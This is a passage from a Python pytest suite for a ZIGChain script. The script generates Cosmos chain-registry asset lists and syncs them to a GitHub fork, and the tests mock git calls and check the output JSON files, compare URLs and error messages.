    timestamp_part = result[len("test-"):]

    # YYYYMMDD-HHMMSS is exactly 15 characters
    assert len(timestamp_part) == 15
    # The 9th character must be a dash separating date and time
    assert timestamp_part[8] == "-"
    # All other characters must be digits
    assert timestamp_part[:8].isdigit()
    assert timestamp_part[9:].isdigit()

    # Parse the timestamp and check the date is today.
    # This catches a wrong strftime format (e.g. %d%m%Y swaps day and month).
    parsed = datetime.datetime.strptime(timestamp_part, "%Y%m%d-%H%M%S")
    assert parsed.date() == datetime.date.today()



######################################################################
# Tests for sync_to_chain_registry
######################################################################


def test_sync_to_chain_registry_returns_none_when_no_changes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """sync_to_chain_registry returns None when the generated output is identical to upstream.

    When git status --porcelain produces no output there is nothing new to commit or push,
    so the function skips the commit/push steps and returns None instead of a compare URL.
    """
    # Import the module so monkeypatch can swap functions on it
    import scripts.generate_chain_registry as gcr

    # Arrange: create out_root on disk so the existence guard passes
    out_root = tmp_path / "out"
    out_root.mkdir()

    def mock_run(cmd, **kwargs):
        # mock_run is called once for every git command the function runs.
        # cmd is the full command as a list, e.g. ["git", "status", "--porcelain"].
        # cmd[:2] takes just the first two items so we can match the command
        # without caring about which flags come after.

        # git status --porcelain returns empty stdout when there are no staged changes.
        # The real function checks: if not status.stdout.strip() → return None
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
        # Every other git command (clone, fetch, checkout…) succeeds silently
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    # Replace the real _run with our fake so no actual git commands run
    monkeypatch.setattr(gcr, "_run", mock_run)
    # These helpers do file/remote work we don't need for this test — make them no-ops
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    # _copy_images_merge returns an int (files copied); 0 means nothing was copied
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    result = sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
    )

    # capsys captures everything printed to stdout during the test
    captured = capsys.readouterr()

    # Assert: no PR URL is returned because there was nothing to push
    assert result is None
    # Assert: the function printed the expected informational messages
    assert "Syncing to chain-registry fork via fresh clone" in captured.out
    assert "No changes detected in chain-registry clone" in captured.out


def test_sync_to_chain_registry_returns_compare_url_when_changes_present(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """sync_to_chain_registry returns a GitHub compare URL when new assets were generated.

    The URL points to the timestamped branch pushed to the ZIGChain fork so the caller
    can open it directly in a browser to create the PR against cosmos/chain-registry.
    """
    import scripts.generate_chain_registry as gcr

    # Arrange: out_root exists; git status reports a changed file
    out_root = tmp_path / "out"
    out_root.mkdir()

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            # Non-empty stdout signals there are staged changes to commit
            return subprocess.CompletedProcess(cmd, 0, stdout="M zigchain/assetlist.json\n", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    result = sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
    )

    # capsys captures everything printed to stdout during the test
    captured = capsys.readouterr()

    # Assert: a well-formed GitHub compare URL is returned
    assert result is not None
    assert result.startswith("https://github.com/cosmos/chain-registry/compare/")
    assert "ZIGChain:chain-registry:zigchain-sync-" in result
    # Assert: the function printed the expected success messages to the terminal
    assert "Syncing to chain-registry fork via fresh clone" in captured.out
    assert "✅ Pushed branch to fork." in captured.out
    assert "Create PR (review changes first):" in captured.out
    # The URL itself is also printed so developers can copy it from the terminal
    assert result in captured.out



def test_sync_to_chain_registry_compare_url_contains_pushed_branch(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The compare URL returned by sync_to_chain_registry contains the exact branch that was pushed.

    The branch name is derived from _timestamped_branch; the URL must embed it so the
    link opens the correct branch on GitHub rather than an arbitrary one.
    """
    import scripts.generate_chain_registry as gcr

    out_root = tmp_path / "out"
    out_root.mkdir()

    # Pin the branch name to a fixed value by replacing _timestamped_branch with a
    # simple function that always returns the same string — no parsing needed
    fixed_branch = "zigchain-sync-20260410-120000"
    monkeypatch.setattr(gcr, "_timestamped_branch", lambda **kw: fixed_branch)

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="M file\n", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    result = sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
    )

    # Assert: the full compare URL matches the exact expected format
    expected_url = (
        "https://github.com/cosmos/chain-registry/compare/"
        f"master...ZIGChain:chain-registry:{fixed_branch}"
    )
    assert result == expected_url



def test_sync_to_chain_registry_both_networks_are_synced(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sync_to_chain_registry syncs both the mainnet and testnet zigchain folders.

    Both networks must be synced on every run so neither is silently skipped if the
    other has no changes.
    """
    import scripts.generate_chain_registry as gcr

    out_root = tmp_path / "out"
    out_root.mkdir()

    # Collect the src paths passed to each _sync_chain_folder call
    synced_srcs: list[str] = []

    def mock_sync(src, dst):
        synced_srcs.append(str(src))

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", mock_sync)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
    )

    # Assert: exactly two syncs — one for mainnet zigchain, one for testnet
    assert len(synced_srcs) == 2
    assert "zigchain" in synced_srcs[0]
    assert "zigchaintestnet" in synced_srcs[1]



def test_sync_to_chain_registry_prints_ethereum_images_count_when_copied(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
) -> None:
    """sync_to_chain_registry prints a message when ethereum images were copied.

    When _copy_images_merge returns a positive count the function prints how many
    images were copied for mainnet and testnet ethereum. This branch is only reached
    when at least one ethereum image exists in the generated output.
    """
    import scripts.generate_chain_registry as gcr

    # Arrange
    out_root = tmp_path / "out"
    out_root.mkdir()

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)

    # Return different counts per network so we can assert each value separately.
    # The first call is mainnet ethereum (src contains "ethereum"),
    # the second call is testnet (src contains "ethereumtestnet").
    def mock_copy_images_merge(src, dst):
        if "ethereumtestnet" in str(src):
            return 1  # testnet had 1 new image
        return 2      # mainnet had 2 new images

    monkeypatch.setattr(gcr, "_copy_images_merge", mock_copy_images_merge)

    # Act
    sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
    )

    captured = capsys.readouterr()

    # Assert: the ethereum images summary message was printed with the correct counts
    assert "Copied ethereum images" in captured.out
    assert "mainnet: 2" in captured.out
    assert "testnet: 1" in captured.out


def test_sync_to_chain_registry_custom_base_branch_appears_in_compare_url(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sync_to_chain_registry uses upstream_base_branch in the compare URL.

    When a non-default base branch is passed (e.g. 'main' instead of 'master'),
    the returned URL must embed it so the PR targets the correct base branch.
    """
    import scripts.generate_chain_registry as gcr

    out_root = tmp_path / "out"
    out_root.mkdir()

    fixed_branch = "zigchain-sync-20260410-120000"
    monkeypatch.setattr(gcr, "_timestamped_branch", lambda **kw: fixed_branch)

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="M file\n", stderr="")
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act: pass "main" as the base branch instead of the default "master"
    result = sync_to_chain_registry(
        out_root=out_root,
        upstream_repo="https://github.com/cosmos/chain-registry",
        fork_repo="https://github.com/ZIGChain/chain-registry",
        upstream_base_branch="main",
    )

    # Assert: the compare URL uses "main" not "master" as the base
    expected_url = (
        "https://github.com/cosmos/chain-registry/compare/"
        f"main...ZIGChain:chain-registry:{fixed_branch}"
    )
    assert result == expected_url


#--------------------
# Negative test for sync_to_chain_registry
#--------------------

def test_sync_to_chain_registry_raises_when_out_root_does_not_exist(tmp_path: Path) -> None:
    """sync_to_chain_registry raises RuntimeError when out_root does not exist.

    The existence check runs before any git operation so the error is clear and immediate —
    no network activity happens when the generated output is missing.
    """

    # Arrange: a path that was never created on disk
    nonexistent = tmp_path / "nonexistent_dir_12345"

    # Act
    with pytest.raises(RuntimeError) as exc:
        sync_to_chain_registry(
            out_root=nonexistent,
            upstream_repo="https://github.com/cosmos/chain-registry",
            fork_repo="https://github.com/ZIGChain/chain-registry",
        )


    # Assert: the error names the missing path so the caller knows exactly what is wrong
    assert "Output root does not exist" in str(exc.value)
    assert str(nonexistent) in str(exc.value)


def test_sync_to_chain_registry_raises_on_git_commit_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sync_to_chain_registry raises RuntimeError when git commit fails.

    This happens when git user.name and user.email are not configured in the environment
    — git refuses to commit without an author identity. The error message must tell the
    caller exactly what to fix.
    """
    import scripts.generate_chain_registry as gcr

    # Arrange: out_root exists so the existence guard passes
    out_root = tmp_path / "out"
    out_root.mkdir()

    def mock_run(cmd, **kwargs):
        # git status must return non-empty output so the function believes there
        # are staged changes and proceeds to the commit step
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="M file\n", stderr="")

        # git commit fails — this is the failure we are testing
        if cmd[:2] == ["git", "commit"]:
            # Simulate git exiting non-zero because no author identity is set
            raise subprocess.CalledProcessError(
                returncode=128,
                cmd=cmd,
                output="Author identity unknown\n",
            )

        # All other git commands (clone, fetch, checkout, add…) succeed silently
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    # Replace real git operations with the mock so no network calls happen
    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    with pytest.raises(RuntimeError) as exc:
        sync_to_chain_registry(
            out_root=out_root,
            upstream_repo="https://github.com/cosmos/chain-registry",
            fork_repo="https://github.com/ZIGChain/chain-registry",
        )

    # Assert: the error message tells the caller exactly which command failed
    assert "git commit failed. Ensure git user.name and user.email are configured." in str(exc.value)
    assert "Command output:" in str(exc.value)


def test_sync_to_chain_registry_raises_on_git_push_failure(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """sync_to_chain_registry raises RuntimeError when git push fails.

    This happens when the caller lacks push access to the fork or credentials
    are not configured. The error message must tell the caller what to check.
    """
    import scripts.generate_chain_registry as gcr

    out_root = tmp_path / "out"
    out_root.mkdir()

    def mock_run(cmd, **kwargs):
        if cmd[:2] == ["git", "status"]:
            return subprocess.CompletedProcess(cmd, 0, stdout="M file\n", stderr="")
        if cmd[:2] == ["git", "push"]:
            # Simulate git exiting non-zero due to missing push credentials
            raise subprocess.CalledProcessError(
                returncode=128,
                cmd=cmd,
                output="Permission denied (publickey)\n",
            )
        return subprocess.CompletedProcess(cmd, 0, stdout="", stderr="")

    monkeypatch.setattr(gcr, "_run", mock_run)
    monkeypatch.setattr(gcr, "_ensure_remote", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_sync_chain_folder", lambda *a, **kw: None)
    monkeypatch.setattr(gcr, "_copy_images_merge", lambda *a, **kw: 0)

    # Act
    with pytest.raises(RuntimeError) as exc:
        sync_to_chain_registry(
            out_root=out_root,
            upstream_repo="https://github.com/cosmos/chain-registry",
            fork_repo="https://github.com/ZIGChain/chain-registry",
        )


    # Assert: the error message guides the caller to check fork access and credentials
    assert "git push failed. Ensure you have push access to the fork and credentials are configured." in str(exc.value)
    assert "Command output:" in str(exc.value)

######################################################################
# Tests for generate_for_network
######################################################################


def test_generate_for_network_writes_assetlist_for_empty_assets(tmp_path: Path) -> None:
    """generate_for_network writes an empty assetlist.json when no assets are provided."""

    # Arrange: no assets of any type
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: assetlist.json is created with the correct chain name and an empty assets array
    assetlist = out_root / "zigchain" / "assetlist.json"
    assert assetlist.exists()
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["chain_name"] == "zigchain"
    assert data["assets"] == []


def test_generate_for_network_writes_native_asset_to_assetlist(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network includes a native asset in the output assetlist.json."""

    # Arrange: one native asset (ZIG)
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    native = NativeAsset(**valid_native_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: the native asset appears in the output with the correct symbol
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "ZIG"


def test_generate_for_network_with_ibc_asset_writes_assetlist(
    valid_ibc_asset_payload: dict[str, Any],
    tmp_path: Path,
) -> None:
    """generate_for_network includes IBC assets in the output assetlist."""

    # Arrange: one IBC asset (USDC bridged from Noble)
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    asset = IBCAsset(**valid_ibc_asset_payload)
    out_root = tmp_path / "out"

    # Act
    generate_for_network(
        network="mainnet",
        chain_name="zigchain",
        eth_chain_name="ethereum",
        natives=[],
        factories=[],
        ibcs=[asset],
        logos_dir=logos_dir,
        out_root=out_root,
        verified_only=False,
    )

    # Assert: assetlist.json exists and contains the IBC asset
    assetlist = out_root / "zigchain" / "assetlist.json"
    assert assetlist.exists()
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["chain_name"] == "zigchain"
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "USDC"


def test_generate_for_network_verified_only_filters_unverified_natives(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True excludes assets where is_verified is False."""

    # Arrange: native asset without is_verified set — getattr fallback returns False
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    native = NativeAsset(**valid_native_asset_payload)

    # Act: run with verified_only=True so the filter is applied
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: unverified native asset is excluded — output assets array is empty
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["assets"] == []


def test_generate_for_network_writes_factory_asset_to_assetlist(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network includes a factory asset in the output assetlist.json."""

    # Arrange
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    factory = FactoryAsset(**valid_factory_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[factory],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: the factory asset appears in the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "PANDA"


def test_generate_for_network_verified_only_keeps_verified_asset(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True keeps assets where is_verified=True."""

    # Arrange: build a verified native asset
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    payload = dict(valid_native_asset_payload)
    payload["is_verified"] = True
    native = NativeAsset(**payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: the verified asset is included
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert len(data["assets"]) == 1
    assert data["assets"][0]["symbol"] == "ZIG"


def test_generate_for_network_multiple_asset_types_all_written(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
    valid_ibc_asset_payload: dict[str, Any],
    valid_factory_asset_payload: dict[str, Any],
    capsys: pytest.CaptureFixture[str],
) -> None:
    """generate_for_network writes native, factory, and IBC assets all to the same assetlist."""

    # Arrange: one asset of each type
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    native = NativeAsset(**valid_native_asset_payload)
    factory = FactoryAsset(**valid_factory_asset_payload)
    ibc = IBCAsset(**valid_ibc_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[native],
        factories=[factory],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: assetlist.json is written with the correct chain_name and schema reference
    assetlist = out_root / "zigchain" / "assetlist.json"
    assert assetlist.exists()
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["chain_name"] == "zigchain"
    assert data["$schema"] == "../assetlist.schema.json"

    # Assert: exactly three assets are present — one per type, nothing dropped or duplicated
    assert len(data["assets"]) == 3
    symbols = {a["symbol"] for a in data["assets"]}
    assert symbols == {"ZIG", "PANDA", "USDC"}

    # Assert: each asset carries its base denom through to the output.
    # Chain-registry format uses "base" (not "base_denom") for the on-chain denomination.
    bases = {a["base"] for a in data["assets"]}
    assert "uzig" in bases
    assert f"coin.{valid_factory_asset_payload['creator']}.panda" in bases
    assert f"ibc/{HASH}" in bases

    # Assert: type_asset is set correctly per asset class —
    # native and factory tokens are sdk.coin; IBC-bridged tokens are ics20
    type_assets = {a["symbol"]: a["type_asset"] for a in data["assets"]}
    assert type_assets["ZIG"] == "sdk.coin"
    assert type_assets["PANDA"] == "sdk.coin"
    assert type_assets["USDC"] == "ics20"

    # Assert: no ethereum assetlist is created — the IBC asset has noble origin, not ethereum
    assert not (out_root / "_non-cosmos" / "ethereum" / "assetlist.json").exists()

    # Assert: print output reflects all three asset types in the counts line
    captured = capsys.readouterr()
    assert "native: 1" in captured.out
    assert "factory: 1" in captured.out
    assert "ibc: 1" in captured.out
    assert "Wrote zigchain/assetlist.json with 3 assets" in captured.out


def test_generate_for_network_use_testnet_paths_writes_to_testnets_subfolder(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with use_testnet_paths=True writes output under testnets/<chain_name>/."""

    # Arrange
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    native = NativeAsset(**valid_native_asset_payload)

    # Act
    generate_for_network(
        network="testnet",
        natives=[native],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchaintestnet",
        eth_chain_name="ethereumtestnet",
        use_testnet_paths=True,
        verified_only=False,
    )

    # Assert: output lands in testnets/<chain_name>/, not at the root level
    assetlist = out_root / "testnets" / "zigchaintestnet" / "assetlist.json"
    assert assetlist.exists()

    # Assert: $schema needs an extra parent level to reach the registry root
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["$schema"] == "../../assetlist.schema.json"
    assert data["chain_name"] == "zigchaintestnet"
    assert len(data["assets"]) == 1


def test_generate_for_network_mainnet_schema_path_uses_single_parent(
    tmp_path: Path,
) -> None:
    """generate_for_network for mainnet uses ../assetlist.schema.json (one level up from chain folder)."""

    # Arrange
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: mainnet schema is one level up from <chain_name>/
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["$schema"] == "../assetlist.schema.json"


def test_generate_for_network_verified_only_filters_unverified_factory_assets(
    tmp_path: Path,
    valid_factory_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True excludes factory assets where is_verified is not True."""

    # Arrange: factory asset without is_verified — getattr fallback returns False
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    factory = FactoryAsset(**valid_factory_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[factory],
        ibcs=[],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: unverified factory asset is excluded from the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["assets"] == []


def test_generate_for_network_verified_only_filters_unverified_ibc_assets(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """generate_for_network with verified_only=True excludes IBC assets where is_verified is not True."""

    # Arrange: IBC asset without is_verified set
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    ibc = IBCAsset(**valid_ibc_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=True,
    )

    # Assert: unverified IBC asset is excluded from the output
    assetlist = out_root / "zigchain" / "assetlist.json"
    data = json.loads(assetlist.read_text(encoding="utf-8"))
    assert data["assets"] == []


# 64-char hex hash for the ethereum-origin IBC asset used in ERC20 tests
_ERC20_HASH = "AABBCCDD" * 8


@pytest.fixture()
def erc20_ibc_asset() -> IBCAsset:
    """Mainnet IBCAsset whose origin is an ERC20 contract on Ethereum (WETH).

    Used by tests that exercise the erc20_from_ibc() path:
    - origin_chain="ethereum" + origin_denom starting with "0x" triggers the ethereum assetlist branch.
    - Uses _ERC20_HASH (distinct from HASH) so it doesn't collide with the USDC fixture.
    """
    return IBCAsset(
        network="mainnet",
        asset_id=f"ibc/{_ERC20_HASH}",
        type="ibc",
        symbol="WETH",
        name="Wrapped Ether",
        decimals=18,
        display_denom="weth",
        base_denom=f"ibc/{_ERC20_HASH}",
        hash=_ERC20_HASH,
        origin_chain="ethereum",
        origin_denom="0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
        traces=[
            IBCTrace(
                type="ibc",
                chain_name="zigchain",
                base_denom=f"ibc/{_ERC20_HASH}",
                path="transfer/channel-5/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
            ),
        ],
        channels=[
            IBCChannel(
                zigchain_channel="channel-5",
                counterparty_chain="ethereum",
                counterparty_channel="channel-0",
            ),
        ],
        denom_units=[
            DenomUnit(denom=f"ibc/{_ERC20_HASH}", exponent=0),
            DenomUnit(denom="weth", exponent=18),
        ],
    )


def test_generate_for_network_ibc_with_ethereum_origin_writes_ethereum_assetlist(
    tmp_path: Path,
    erc20_ibc_asset: IBCAsset,
) -> None:
    """An IBC asset with origin_chain='ethereum' and a 0x origin_denom writes an ethereum assetlist."""

    # Arrange: IBC asset whose origin is an ERC20 contract on ethereum.
    # erc20_from_ibc() returns non-None only when origin_chain == "ethereum"
    # AND origin_denom starts with "0x".
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[erc20_ibc_asset],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: the IBC asset appears in zigchain's assetlist
    zc_assetlist = out_root / "zigchain" / "assetlist.json"
    zc_data = json.loads(zc_assetlist.read_text(encoding="utf-8"))
    assert len(zc_data["assets"]) == 1

    # Assert: ethereum assetlist is written with the ERC20 entry
    eth_assetlist = out_root / "_non-cosmos" / "ethereum" / "assetlist.json"
    assert eth_assetlist.exists()
    eth_data = json.loads(eth_assetlist.read_text(encoding="utf-8"))
    assert eth_data["chain_name"] == "ethereum"
    assert len(eth_data["assets"]) == 1


def test_generate_for_network_no_erc20_assets_prints_skip_message(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
    capsys: pytest.CaptureFixture[str],
) -> None:
    """When no IBC asset has an ethereum origin, a skip message is printed and no ethereum assetlist is created."""

    # Arrange: IBC asset with noble origin — erc20_from_ibc() returns None for it
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    ibc = IBCAsset(**valid_ibc_asset_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: the skip message is printed to stdout
    captured = capsys.readouterr()
    assert "No ERC20-origin assets detected for mainnet" in captured.out

    # Assert: no ethereum output directory is created
    eth_assetlist = out_root / "_non-cosmos" / "ethereum" / "assetlist.json"
    assert not eth_assetlist.exists()


def test_generate_for_network_stale_eth_out_deleted_when_no_erc20_assets(
    tmp_path: Path,
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """A stale ethereum output directory left by a previous run is deleted when no ERC20-origin assets are present."""

    # Arrange: simulate a stale ethereum output from a previous run
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"
    stale_eth_out = out_root / "_non-cosmos" / "ethereum"
    stale_eth_out.mkdir(parents=True)
    (stale_eth_out / "assetlist.json").write_text('{"stale": true}', encoding="utf-8")
    assert stale_eth_out.exists()

    # Act: run with a non-ethereum IBC asset — no ERC20 entry will be generated
    ibc = IBCAsset(**valid_ibc_asset_payload)
    generate_for_network(
        network="mainnet",
        natives=[],
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

    # Assert: the stale directory is removed to avoid leaving outdated outputs
    assert not stale_eth_out.exists()


def test_generate_for_network_assets_with_order_sorted_before_unordered(
    tmp_path: Path,
    valid_native_asset_payload: dict[str, Any],
    valid_ibc_asset_payload: dict[str, Any],
) -> None:
    """Assets with an explicit order field appear before unordered assets regardless of input order."""

    # Arrange: native asset has no order; IBC asset has order=1.
    # Native is passed first in the list to verify output position is governed by
    # _asset_sort_key, not the input list position.
    logos_dir = tmp_path / "logos"
    logos_dir.mkdir()
    out_root = tmp_path / "out"

    native = NativeAsset(**valid_native_asset_payload)  # no order field → sorts last

    ibc_payload = dict(valid_ibc_asset_payload)
    ibc_payload["order"] = 1  # explicit order → sorts first
    ibc = IBCAsset(**ibc_payload)

    # Act
    generate_for_network(
        network="mainnet",
        natives=[native],  # native passed first — should still appear second
        factories=[],
        ibcs=[ibc],
        logos_dir=logos_dir,
        out_root=out_root,
        chain_name="zigchain",
        eth_chain_name="ethereum",
        verified_only=False,
    )

